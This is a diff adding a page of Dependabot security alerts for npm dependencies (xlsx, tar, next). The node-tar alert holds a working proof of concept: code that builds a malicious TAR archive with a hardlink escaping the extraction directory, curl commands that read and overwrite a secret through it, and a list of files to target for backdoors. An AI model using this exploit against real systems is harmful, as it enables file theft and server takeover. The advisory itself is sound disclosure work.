@@ -1,0 +1,288 @@
+Prototype Pollution in sheetJS #1
+ Open Opened last week on xlsx (npm) · package-lock.json
+Package
+Affected versions
+Patched version
+xlsx
+(npm)
+< 0.19.3
+None
+All versions of SheetJS CE through 0.19.2 are vulnerable to "Prototype Pollution" when reading specially crafted files. Workflows that do not read arbitrary files (for example, exporting data to spreadsheet files) are unaffected.
+
+A non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package xlsx are no longer maintained. Version 0.19.3 can be downloaded via https://cdn.sheetjs.com/.
+
+
+-----
+
+node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal #9
+ Open Opened 17 hours ago on tar (npm) · package-lock.json
+Upgrade tar to fix 1 Dependabot alert in package-lock.json
+Upgrade tar to version 7.5.7 or later. For example:
+
+"dependencies": {
+  "tar": ">=7.5.7"
+}
+"devDependencies": {
+  "tar": ">=7.5.7"
+}
+Transitive dependency tar 7.5.6 is introduced via
+supabase 2.72.7  tar 7.5.6
+Package
+Affected versions
+Patched version
+tar
+(npm)
+< 7.5.7
+7.5.7
+Summary
+node-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.
+
+Details
+The vulnerability exists in lib/unpack.js. When extracting a hardlink, two functions handle the linkpath differently:
+
+Security check in [STRIPABSOLUTEPATH]:
+
+const entryDir = path.posix.dirname(entry.path);
+const resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));
+if (resolved.startsWith('../')) { /* block */ }
+Hardlink creation in [HARDLINK]:
+
+const linkpath = path.resolve(this.cwd, entry.linkpath);
+fs.linkSync(linkpath, dest);
+Example: An application extracts a TAR using tar.extract({ cwd: '/var/app/uploads/' }). The TAR contains entry a/b/c/d/x as a hardlink to ../../../../etc/passwd.
+
+Security check resolves the linkpath relative to the entry's parent directory: a/b/c/d/ + ../../../../etc/passwd = etc/passwd. No ../ prefix, so it passes.
+
+Hardlink creation resolves the linkpath relative to the extraction directory (this.cwd): /var/app/uploads/ + ../../../../etc/passwd = /etc/passwd. This escapes to the system's /etc/passwd.
+
+The security check and hardlink creation use different starting points (entry directory a/b/c/d/ vs extraction directory /var/app/uploads/), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.
+
+PoC
+Setup
+Create a new directory with these files:
+
+poc/
+├── package.json
+├── secret.txt          ← sensitive file (target)
+├── server.js           ← vulnerable server
+├── create-malicious-tar.js
+├── verify.js
+└── uploads/            ← created automatically by server.js
+    └── (extracted files go here)
+package.json
+
+{ "dependencies": { "tar": "^7.5.0" } }
+secret.txt (sensitive file outside uploads/)
+
+DATABASE_PASSWORD=supersecret123
+server.js (vulnerable file upload server)
+
+const http = require('http');
+const fs = require('fs');
+const path = require('path');
+const tar = require('tar');
+
+const PORT = 3000;
+const UPLOAD_DIR = path.join(__dirname, 'uploads');
+fs.mkdirSync(UPLOAD_DIR, { recursive: true });
+
+http.createServer((req, res) => {
+  if (req.method === 'POST' && req.url === '/upload') {
+    const chunks = [];
+    req.on('data', c => chunks.push(c));
+    req.on('end', async () => {
+      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));
+      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });
+      res.end('Extracted\n');
+    });
+  } else if (req.method === 'GET' && req.url === '/read') {
+    // Simulates app serving extracted files (e.g., file download, static assets)
+    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
+    if (fs.existsSync(targetPath)) {
+      res.end(fs.readFileSync(targetPath));
+    } else {
+      res.end('File not found\n');
+    }
+  } else if (req.method === 'POST' && req.url === '/write') {
+    // Simulates app writing to extracted file (e.g., config update, log append)
+    const chunks = [];
+    req.on('data', c => chunks.push(c));
+    req.on('end', () => {
+      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
+      if (fs.existsSync(targetPath)) {
+        fs.writeFileSync(targetPath, Buffer.concat(chunks));
+        res.end('Written\n');
+      } else {
+        res.end('File not found\n');
+      }
+    });
+  } else {
+    res.end('POST /upload, GET /read, or POST /write\n');
+  }
+}).listen(PORT, () => console.log(`http://localhost:${PORT}`));
+create-malicious-tar.js (attacker creates exploit TAR)
+
+const fs = require('fs');
+
+function tarHeader(name, type, linkpath = '', size = 0) {
+  const b = Buffer.alloc(512, 0);
+  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);
+  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);
+  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);
+  b.write('        ', 148);
+  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;
+  if (linkpath) b.write(linkpath, 157);
+  b.write('ustar\x00', 257); b.write('00', 263);
+  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];
+  b.write(sum.toString(8).padStart(6, '0') + '\x00 ', 148);
+  return b;
+}
+
+// Hardlink escapes to parent directory's secret.txt
+fs.writeFileSync('malicious.tar', Buffer.concat([
+  tarHeader('d/', 'dir'),
+  tarHeader('d/x', 'link', '../secret.txt'),
+  Buffer.alloc(1024)
+]));
+console.log('Created malicious.tar');
+Run
+# Setup
+npm install
+echo "DATABASE_PASSWORD=supersecret123" > secret.txt
+
+# Terminal 1: Start server
+node server.js
+
+# Terminal 2: Execute attack
+node create-malicious-tar.js
+curl -X POST --data-binary @malicious.tar http://localhost:3000/upload
+
+# READ ATTACK: Steal secret.txt content via the hardlink
+curl http://localhost:3000/read
+# Returns: DATABASE_PASSWORD=supersecret123
+
+# WRITE ATTACK: Overwrite secret.txt through the hardlink
+curl -X POST -d "PWNED" http://localhost:3000/write
+
+# Confirm secret.txt was modified
+cat secret.txt
+Impact
+An attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:
+
+Immediate (Read Attack): If the application serves extracted files, attacker can read any file readable by the process.
+
+Conditional (Write Attack): If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.
+
+Remote Code Execution / Server Takeover
+Attack Vector	Target File	Result
+SSH Access	~/.ssh/authorized_keys	Direct shell access to server
+Cron Backdoor	/etc/cron.d/*, ~/.crontab	Persistent code execution
+Shell RC Files	~/.bashrc, ~/.profile	Code execution on user login
+Web App Backdoor	Application .js, .php, .py files	Immediate RCE via web requests
+Systemd Services	/etc/systemd/system/*.service	Code execution on service restart
+User Creation	/etc/passwd (if running as root)	Add new privileged user
+Data Exfiltration & Corruption
+Overwrite arbitrary files via hardlink escape + subsequent write operations
+Read sensitive files by creating hardlinks that point outside extraction directory
+Corrupt databases and application state
+Steal credentials from config files, .env, secrets
+
+-----
+
+SheetJS Regular Expression Denial of Service (ReDoS) #2
+ Open Opened last week on xlsx (npm) · package-lock.json
+Transitive paths cannot be loaded
+The transitive paths are currently unavailable due to a system error. Please try reloading the page, or come back later.
+
+Package
+Affected versions
+Patched version
+xlsx
+(npm)
+< 0.20.2
+None
+SheetJS Community Edition before 0.20.2 is vulnerable.to Regular Expression Denial of Service (ReDoS).
+
+A non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package xlsx are no longer maintained. Version 0.20.2 can be downloaded via https://cdn.sheetjs.com/.
+
+@dependabot dependabot bot opened this last week
+
+-----
+
+Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components #7
+ Open Opened yesterday on next (npm) · package-lock.json
+Upgrade next to fix 3 Dependabot alerts in package-lock.json
+Upgrade next to version 16.1.5 or later. For example:
+
+"dependencies": {
+  "next": ">=16.1.5"
+}
+"devDependencies": {
+  "next": ">=16.1.5"
+}
+Package
+Affected versions
+Patched version
+next
+(npm)
+>= 16.0.0-beta.0, < 16.0.11
+16.0.11
+A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as CVE-2026-23864.
+
+A specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.
+
+-----
+
+Next.js has Unbounded Memory Consumption via PPR Resume Endpoint #8
+ Open Opened yesterday on next (npm) · package-lock.json
+Upgrade next to fix 3 Dependabot alerts in package-lock.json
+Upgrade next to version 16.1.5 or later. For example:
+
+"dependencies": {
+  "next": ">=16.1.5"
+}
+"devDependencies": {
+  "next": ">=16.1.5"
+}
+Package
+Affected versions
+Patched version
+next
+(npm)
+>= 16.0.0-beta.0, < 16.1.5
+16.1.5
+A denial of service vulnerability exists in Next.js versions with Partial Prerendering (PPR) enabled when running in minimal mode. The PPR resume endpoint accepts unauthenticated POST requests with the Next-Resume: 1 header and processes attacker-controlled postponed state data. Two closely related vulnerabilities allow an attacker to crash the server process through memory exhaustion:
+
+Unbounded request body buffering: The server buffers the entire POST request body into memory using Buffer.concat() without enforcing any size limit, allowing arbitrarily large payloads to exhaust available memory.
+
+Unbounded decompression (zipbomb): The resume data cache is decompressed using inflateSync() without limiting the decompressed output size. A small compressed payload can expand to hundreds of megabytes or gigabytes, causing memory exhaustion.
+
+Both attack vectors result in a fatal V8 out-of-memory error (FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory) causing the Node.js process to terminate. The zipbomb variant is particularly dangerous as it can bypass reverse proxy request size limits while still causing large memory allocation on the server.
+
+To be affected, an application must run with experimental.ppr: true or cacheComponents: true configured along with the NEXT_PRIVATE_MINIMAL_MODE=1 environment variable.
+
+Strongly consider upgrading to 15.6.0-canary.61 or 16.1.5 to reduce risk and prevent availability issues in Next applications.
+
+-----
+
+Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration #6
+ Open Opened 2 days ago on next (npm) · package-lock.json
+Upgrade next to fix 3 Dependabot alerts in package-lock.json
+Upgrade next to version 16.1.5 or later. For example:
+
+"dependencies": {
+  "next": ">=16.1.5"
+}
+"devDependencies": {
+  "next": ">=16.1.5"
+}
+Package
+Affected versions
+Patched version
+next
+(npm)
+>= 15.6.0-canary.0, < 16.1.5
+16.1.5
+A DoS vulnerability exists in self-hosted Next.js applications that have remotePatterns configured for the Image Optimizer. The image optimization endpoint (/_next/image) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that remotePatterns is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.
+
+Strongly consider upgrading to 15.5.10 and 16.1.5 to reduce risk and prevent availability issues in Next applications.
